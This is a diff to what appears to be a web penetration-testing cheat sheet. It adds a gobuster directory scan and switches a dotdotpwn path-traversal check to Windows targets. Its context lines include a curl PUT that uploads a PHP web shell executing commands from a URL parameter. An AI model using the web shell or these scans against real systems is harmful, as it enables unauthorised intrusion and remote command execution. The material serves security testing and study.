@@ -354,9 +354,8 @@ View Source
 Step 2: 
 Start Secondary Scans
 ```
-
 wig-git http://INSERTIPADDRESS/path
-
+gobuster -u http://INSERTIPADDRESS -e -f -n -w /usr/share/wordlists/dirb/big.txt
 ```
 # CMS checker 
 cmsmap-git -t http://INSERTIPADDRESS
@@ -378,7 +377,7 @@ curl -v -X OPTIONS http://INSERTIPADDRESS/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
 
 # Check for title and all links
-dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
+dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o windows
 
 #To append a .pl to the end of the resolutions:
 dirb http://INSERTIPADDRESS/somedirectory -X .pl
